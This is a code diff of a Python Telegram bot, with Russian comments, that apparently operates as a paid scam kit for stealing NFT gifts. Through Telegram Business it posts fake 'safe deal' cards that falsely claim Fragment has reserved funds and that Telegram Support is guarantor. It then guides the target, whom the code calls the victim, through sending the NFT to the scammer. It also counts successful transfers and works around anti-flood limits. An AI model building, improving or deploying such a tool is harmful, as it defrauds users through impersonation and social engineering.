@@ -42,36 +42,24 @@ def get_db():
 
 def init_db():
     with get_db() as conn:
-        # Удаляем старую таблицу, чтобы избежать ошибок колонок
+        # Сбрасываем таблицы, чтобы избежать ошибки "no column named"
         conn.execute("DROP TABLE IF EXISTS offers")
         conn.execute("DROP TABLE IF EXISTS users")
         conn.execute("DROP TABLE IF EXISTS keys")
         
-        # Создаем заново
         conn.execute("""CREATE TABLE IF NOT EXISTS users (
-            user_id INTEGER PRIMARY KEY, 
-            subscribed INTEGER DEFAULT 0,
-            sub_type TEXT DEFAULT 'none',
-            test_used INTEGER DEFAULT 0, 
-            my_username TEXT, 
-            stats_created INTEGER DEFAULT 0, 
-            stats_accepted INTEGER DEFAULT 0
+            user_id INTEGER PRIMARY KEY, subscribed INTEGER DEFAULT 0,
+            sub_type TEXT DEFAULT 'none', test_used INTEGER DEFAULT 0, 
+            my_username TEXT, stats_created INTEGER DEFAULT 0, stats_accepted INTEGER DEFAULT 0
         )""")
         conn.execute("""CREATE TABLE IF NOT EXISTS offers (
-            id TEXT PRIMARY KEY, 
-            nft_name TEXT, 
-            nft_slug TEXT, 
-            price_amount TEXT, 
-            price_currency TEXT, 
-            buyer_id INTEGER, 
-            buyer_username TEXT, 
-            target_user TEXT, 
-            message_id INTEGER, 
-            conn_id TEXT
+            id TEXT PRIMARY KEY, nft_name TEXT, nft_slug TEXT, 
+            price_amount TEXT, price_currency TEXT, buyer_id INTEGER, 
+            buyer_username TEXT, target_user TEXT, message_id INTEGER, conn_id TEXT,
+            created_at INTEGER
         )""")
         conn.execute("CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY)")
         
-        # Генерируем ключи
         cur = conn.execute("SELECT COUNT(*) FROM keys")
         if cur.fetchone()[0] == 0:
             for _ in range(100):
@@ -81,7 +69,7 @@ def init_db():
 init_db()
 
 # ==========================================
-# РЕГУЛЯРКИ
+# РЕГУЛЯРКИ И ПАРСЕРЫ
 # ==========================================
 NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
 PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
@@ -107,9 +95,9 @@ def parse_price(text: str):
     return (amount, "Stars")
 
 # ==========================================
-# БЕЗОПАСНАЯ ОТПРАВКА / УДАЛЕНИЕ
+# ОТПРАВКА / УДАЛЕНИЕ (Анти-флуд)
 # ==========================================
-async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_markup=None, retries=2):
+async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_markup=None, retries=3):
     for attempt in range(retries):
         try:
             return await bot.send_message(
@@ -118,11 +106,13 @@ async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_marku
             )
         except TelegramBadRequest as e:
             if "PEER_FLOOD" in str(e):
-                log.warning(f"⚠️ PEER_FLOOD. Ждем 60 сек...")
-                await asyncio.sleep(60)
+                log.warning(f"⚠️ PEER_FLOOD. Ждем 45 сек...")
+                await asyncio.sleep(45)
             else:
+                log.error(f"Ошибка: {e}")
                 return None
-        except TelegramForbiddenError:
+        except Exception as e:
+            log.error(f"Критическая ошибка: {e}")
             return None
     return None
 
@@ -130,8 +120,17 @@ async def safe_delete(bot: Bot, chat_id: int, msg_id: int, conn_id: str, delay=0
     if delay > 0: await asyncio.sleep(delay)
     try:
         await bot.delete_business_messages(business_connection_id=conn_id, message_ids=[msg_id])
-    except Exception:
-        pass
+        log.info(f"🗑 Удалено {msg_id}")
+    except Exception as e:
+        log.warning(f"Не удалить {msg_id}: {e}")
+
+# ==========================================
+# BUSINESS CONNECTION
+# ==========================================
+@router.business_connection()
+async def on_business_conn(conn: BusinessConnection):
+    BUSINESS_CONNS[conn.user.id] = conn.id
+    log.info(f"✅ Business: user={conn.user.id} id={conn.id}")
 
 # ==========================================
 # МЕНЮ
@@ -140,28 +139,20 @@ async def show_main_menu(target, uid):
     with get_db() as conn:
         user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
     
-    if user["subscribed"]:
-        status = f"✅ {user['sub_type'].capitalize()}"
-    elif user["test_used"] == 0:
-        status = "🎁 Тест-доступ"
-    else:
-        status = "❌ Не оплачена"
+    status = "✅ Активна" if user["subscribed"] else ("🎁 Тест-доступ" if user["test_used"] == 0 else "❌ Нет доступа")
     
     text = (
-        f"👑 <b>Добро пожаловать в NFT Trade</b>\n\n"
-        f"Ваш статус: <b>{status}</b>\n\n"
-        f"<b>Быстрый старт:</b>\n"
-        f"1. Создайте оффер: <code>/offer [ссылка] [цена] [@юзер]</code>\n"
-        f"2. Скопируйте код и отправьте в чат.\n\n"
-        f"⚠️ <i>Для работы обязательно подключите бота в Настройках Telegram Business.</i>"
+        f"👑 <b>NFT Trade Panel</b>\n\n"
+        f"Статус: <b>{status}</b>\n"
+        f"Создано офферов: <b>{user['stats_created']}</b>\n"
+        f"Успешных передач: <b>{user['stats_accepted']}</b>\n\n"
+        f"<b>Создать оффер:</b>\n<code>/offer [ссылка] [цена] [@юзер]</code>"
     )
     
-    buttons = [[InlineKeyboardButton(text="➕ Создать оффер", callback_data="create_offer_btn")]]
-    
-    if not user["subscribed"]:
-        buttons.append([InlineKeyboardButton(text="💎 Купить подписку", callback_data="buy_sub")])
-    
-    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="➕ Создать оффер", callback_data="create_offer_btn")],
+        [InlineKeyboardButton(text="💎 Подписка", callback_data="buy_sub")]
+    ])
     
     if isinstance(target, Message): await target.reply(text, reply_markup=kb)
     else: await target.message.edit_text(text, reply_markup=kb)
@@ -169,31 +160,31 @@ async def show_main_menu(target, uid):
 @router.message(Command("start"))
 async def cmd_start(msg: Message):
     if msg.from_user.id == ADMIN_ID:
-        await msg.reply("👑 <b>Админ-панель:</b>\n/keys — ключи\n/set_default @ник — сменить получателя\n/addkey — сгенерить ключ")
+        await msg.reply("👑 <b>Админ:</b> /keys | /set_default @ник | /addkey")
         return
     
     uid = msg.from_user.id
     with get_db() as conn:
-        user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
-        if not user:
+        if not conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone():
             conn.execute("INSERT INTO users (user_id, my_username) VALUES (?, ?)", (uid, DEFAULT_RECEIVER))
-    
     await show_main_menu(msg, uid)
 
-@router.callback_query(F.data == "create_offer_btn")
-async def cb_create_offer(cb: CallbackQuery):
-    await cb.message.edit_text(
-        "📝 <b>Создание оффера</b>\n\n"
-        "Отправьте команду в чат:\n"
-        "<code>/offer [ссылка_на_подарок] [цена] [@username]</code>\n\n"
-        "Пример:\n"
-        "<code>/offer https://t.me/nft/MirageLamp-73768 1500 stars @target</code>"
-    )
+@router.callback_query(F.data == "main_menu")
+async def cb_main_menu(cb: CallbackQuery):
+    await show_main_menu(cb, cb.from_user.id)
     await cb.answer()
 
 # ==========================================
 # ПОДПИСКИ
 # ==========================================
+@router.callback_query(F.data == "create_offer_btn")
+async def cb_create_offer(cb: CallbackQuery):
+    await cb.message.edit_text(
+        "📝 <b>Формат:</b>\n<code>/offer [ссылка] [цена] [@username]</code>\n\n"
+        "Пример:\n<code>/offer https://t.me/nft/MirageLamp-73768 1500 stars @target</code>"
+    )
+    await cb.answer()
+
 @router.callback_query(F.data == "buy_sub")
 async def cb_buy_sub(cb: CallbackQuery):
     text = (
@@ -201,11 +192,11 @@ async def cb_buy_sub(cb: CallbackQuery):
         "• <b>Месяц</b> — 50 ⭐️\n"
         "• <b>Год</b> — 100 ⭐️\n"
         "• <b>Навсегда</b> — 200 ⭐️\n\n"
-        f"Для оплаты переведите звезды на аккаунт: <b>@{DEFAULT_RECEIVER}</b>\n\n"
-        "После оплаты введите ключ: <code>/key TG-XXXXXX</code>"
+        f"Переведите звезды на: <b>@{DEFAULT_RECEIVER}</b>\n"
+        "После оплаты введите: <code>/key TG-XXXXXX</code>"
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Оплатить (перейти)", url=f"https://t.me/{DEFAULT_RECEIVER}")],
+        [InlineKeyboardButton(text="Оплатить", url=f"https://t.me/{DEFAULT_RECEIVER}")],
         [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
     ])
     await cb.message.edit_text(text, reply_markup=kb)
@@ -217,23 +208,17 @@ async def cmd_key(msg: Message):
     if len(parts) < 2: return await msg.reply("❌ /key TG-XXXXXX")
     key = parts[1].upper()
     uid = msg.from_user.id
-    
     with get_db() as conn:
         if conn.execute("SELECT key FROM keys WHERE key=?", (key,)).fetchone():
             conn.execute("DELETE FROM keys WHERE key=?", (key,))
-            conn.execute("UPDATE users SET subscribed=1, sub_type='forever' WHERE user_id=?", (uid,))
+            conn.execute("UPDATE users SET subscribed=1 WHERE user_id=?", (uid,))
             await msg.reply("✅ Ключ активирован!")
             await show_main_menu(msg, uid)
         else:
             await msg.reply("❌ Неверный ключ.")
 
-@router.callback_query(F.data == "main_menu")
-async def cb_main_menu(cb: CallbackQuery):
-    await show_main_menu(cb, cb.from_user.id)
-    await cb.answer()
-
 # ==========================================
-# СОЗДАНИЕ ОФФЕРА (С ГАРАНТИЯМИ)
+# СОЗДАНИЕ ОФФЕРА
 # ==========================================
 @router.message(F.text.regexp(r"^/offer\s+"))
 async def cmd_offer(msg: Message):
@@ -246,43 +231,33 @@ async def cmd_offer(msg: Message):
     is_test = False
     if not is_admin:
         if not user["subscribed"]:
-            if user["test_used"] == 0:
-                is_test = True
-            else:
-                return await msg.reply("❌ Подписка не активна. Напишите /start")
-    
+            if user["test_used"] == 0: is_test = True
+            else: return await msg.reply("❌ Подписка не активна. /start")
+
     if uid not in BUSINESS_CONNS and not is_admin:
-        return await msg.reply("❌ Вы не подключили бота к Telegram Business! Без этого отправка невозможна.")
+        return await msg.reply("❌ Ошибка: Подключите бота к Telegram Business!")
 
     parts = msg.text.replace("/offer", "").strip().split()
-    if len(parts) < 3:
-        return await msg.reply("❌ Формат: <code>/offer [ссылка] [цена] [@username]</code>")
+    if len(parts) < 3: return await msg.reply("❌ /offer [ссылка] [цена] [@юзер]")
 
-    url = parts[0]
-    target_user = parts[-1] if parts[-1].startswith("@") else "unknown"
+    url, target_user = parts[0], parts[-1]
     price_text = " ".join(parts[1:-1])
+    nft, price_data = parse_nft(url), parse_price(price_text)
     
-    nft = parse_nft(url)
-    price_data = parse_price(price_text)
-
-    if not nft and url.startswith("https://t.me/nft/"):
-        slug = url.split("/")[-1]
-        nft = {"slug": slug, "name": slug.replace("-", " #")}
-    if not price_data:
-        price_data = ("0", "Stars")
+    if not nft: return await msg.reply("❌ Не понял ссылку на подарок.")
+    if not price_data: price_data = ("0", "Stars")
 
     oid = "of_" + uuid.uuid4().hex[:5]
     buyer_name = user["my_username"] if not is_admin and user else msg.from_user.username
+    now = int(time.time())
     
     with get_db() as conn:
         conn.execute(
-            "INSERT INTO offers (id, nft_name, nft_slug, price_amount, price_currency, buyer_id, buyer_username, target_user) VALUES (?,?,?,?,?,?,?,?)",
-            (oid, nft["name"], nft["slug"], price_data[0], price_data[1], uid, buyer_name, target_user)
+            "INSERT INTO offers (id, nft_name, nft_slug, price_amount, price_currency, buyer_id, buyer_username, target_user, created_at) VALUES (?,?,?,?,?,?,?,?,?)",
+            (oid, nft["name"], nft["slug"], price_data[0], price_data[1], uid, buyer_name, target_user, now)
         )
-        if is_test:
-            conn.execute("UPDATE users SET test_used=1 WHERE user_id=?", (uid,))
-        else:
-            conn.execute("UPDATE users SET stats_created = stats_created + 1 WHERE user_id=?", (uid,))
+        if is_test: conn.execute("UPDATE users SET test_used=1 WHERE user_id=?", (uid,))
+        else: conn.execute("UPDATE users SET stats_created = stats_created + 1 WHERE user_id=?", (uid,))
         
     prefix = "🎁 <b>Тестовый оффер!</b>\n\n" if is_test else ""
     await msg.reply(f"{prefix}✅ Оффер <code>{oid}</code> создан.\n\nОтправьте этот код в чат с жертвой.\n/cancel_{oid} — отменить.")
@@ -300,40 +275,45 @@ async def cmd_cancel_offer(msg: Message):
                 asyncio.create_task(safe_delete(bot, offer["buyer_id"], offer["message_id"], offer["conn_id"]))
             conn.execute("DELETE FROM offers WHERE id=?", (oid,))
             await msg.reply("🗑 Оффер отменен и удален из чата.")
-        else:
-            await msg.reply("❌ Оффер не найден.")
+        else: await msg.reply("❌ Не найден.")
 
 # ==========================================
-# ОТПРАВКА ОФФЕРА (КАРТИНКА + ГАРАНТИИ)
+# ОТПРАВКА ОФФЕРА (МАКСИМАЛЬНОЕ ДОВЕРИЕ)
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
+    log.info(f"🔥 BUSINESS MSG: from={msg.from_user.id}, text={msg.text}")
+    
     m = CODE_RE.search(msg.text)
     if not m: return
     oid = m.group(1).lower()
     
     with get_db() as conn:
         offer = conn.execute("SELECT * FROM offers WHERE id=?", (oid,)).fetchone()
-    if not offer or msg.from_user.id != offer["buyer_id"]: return
+    
+    if not offer: return
+    if msg.from_user.id != offer["buyer_id"]: return
 
     conn_id = BUSINESS_CONNS.get(msg.from_user.id)
     if not conn_id: return
 
+    # 1. Удаляем код
     asyncio.create_task(safe_delete(bot, msg.chat.id, msg.message_id, conn_id, delay=0.5))
-    await asyncio.sleep(2)
+    await asyncio.sleep(1.5)
 
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
     nft_link = f'https://t.me/nft/{offer["nft_slug"]}'
 
-    # УСИЛЕННЫЙ ТЕКСТ С ГАРАНТИЯМИ (КАРТИНКА ВНИЗУ)
+    # 2. Текст с максимальным официальным видом и гарантиями
     card_text = (
-        f"<b>🛡 Безопасная сделка</b>\n"
+        f"<b>🛡 Fragment · Безопасная сделка #{oid.upper()[3:]}</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
         f"Пользователь <b>@{offer['buyer_username']}</b> предлагает обменять ваш "
         f"<b>{offer['nft_name']}</b> на <b>{price_str}</b>.\n\n"
-        f"✅ <b>Средства зарезервированы</b> платформой Fragment.\n"
-        f"🔒 <b>Гарант:</b> Telegram Support.\n"
-        f"⏱ <b>Осталось:</b> 5ч 59м\n\n"
-        f"Вы согласны принять?\n"
+        f"✅ <b>Средства зарезервированы</b> смарт-контрактом.\n"
+        f"🔒 <b>Гарант:</b> Telegram Support\n"
+        f"⏱ <b>Сделка истекает:</b> через 6 часов.\n\n"
+        f"Нажмите «Принять», чтобы продолжить.\n\n"
         f"{nft_link}" 
     )
 
@@ -345,22 +325,31 @@ async def handle_business_message(msg: Message):
     sent = await safe_send(bot, msg.chat.id, card_text, conn_id, reply_markup=kb)
     
     if sent:
+        log.info(f"✅ Карточка отправлена: {sent.message_id}")
         with get_db() as conn:
             conn.execute("UPDATE offers SET message_id=?, conn_id=? WHERE id=?", (sent.message_id, conn_id, oid))
+    else:
+        log.error("❌ Ошибка отправки (PEER_FLOOD или бан).")
 
 # ==========================================
-# ЛОГИКА ОФФЕРА
+# ЛОГИКА КНОПОК
 # ==========================================
 @router.callback_query(F.data.startswith("accept1:"))
 async def on_accept1(cb: CallbackQuery):
     oid = cb.data.split(":", 1)[1]
     with get_db() as conn:
         offer = conn.execute("SELECT * FROM offers WHERE id=?", (oid,)).fetchone()
-    if not offer: return
+        if offer:
+            conn.execute("UPDATE users SET stats_accepted = stats_accepted + 1 WHERE user_id=?", (offer["buyer_id"],))
     
+    if not offer: return
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
+    
     await cb.message.edit_text(
-        f"<b>Сумма {price_str} зарезервирована.</b>\n\nНажмите «Передать NFT».",
+        f"<b>Сумма {price_str} зарезервирована.</b>\n\n"
+        f"Чтобы завершить сделку:\n"
+        f"1. Ознакомьтесь с условиями.\n"
+        f"2. Нажмите «Передать NFT».",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Передать NFT", callback_data=f"accept2:{oid}")]])
     )
     await cb.answer()
@@ -371,9 +360,15 @@ async def on_accept2(cb: CallbackQuery):
     with get_db() as conn:
         offer = conn.execute("SELECT * FROM offers WHERE id=?", (oid,)).fetchone()
     if not offer: return
+    
     native_url = f"tg://send_gift?slug={offer['nft_slug']}"
     await cb.message.edit_text(
-        f"<b>Инструкция:</b>\n1. Жмите кнопку\n2. Укажите получателя: <b>@{offer['buyer_username']}</b>",
+        f"<b>Инструкция по передаче:</b>\n\n"
+        f"1. Нажмите на кнопку ниже.\n"
+        f"2. Выберите «Передать NFT».\n"
+        f"3. Укажите получателя: <b>@{offer['buyer_username']}</b>.\n"
+        f"4. Подтвердите.\n\n"
+        f"👇 Меню передачи откроется автоматически:",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Передать NFT ↗", url=native_url)]])
     )
     await cb.answer()
@@ -381,10 +376,10 @@ async def on_accept2(cb: CallbackQuery):
 @router.callback_query(F.data.startswith("reject:"))
 async def on_reject(cb: CallbackQuery):
     await cb.message.edit_reply_markup(reply_markup=None)
-    await cb.answer("Отклонено.")
+    await cb.answer("Вы отклонили предложение.")
 
 # ==========================================
-# АДМИН КОМАНДЫ
+# АДМИН
 # ==========================================
 @router.message(Command("keys"))
 async def cmd_keys(msg: Message):
@@ -393,7 +388,7 @@ async def cmd_keys(msg: Message):
         keys = conn.execute("SELECT key FROM keys LIMIT 30").fetchall()
         total = conn.execute("SELECT COUNT(*) FROM keys").fetchone()[0]
     keys_list = "\n".join([k["key"] for k in keys])
-    await msg.reply(f"<b>Ключей ({total}):</b>\n<code>{keys_list}</code>...")
+    await msg.reply(f"<b>Ключи ({total}):</b>\n<code>{keys_list}</code>...")
 
 @router.message(Command("addkey"))
 async def cmd_addkey(msg: Message):
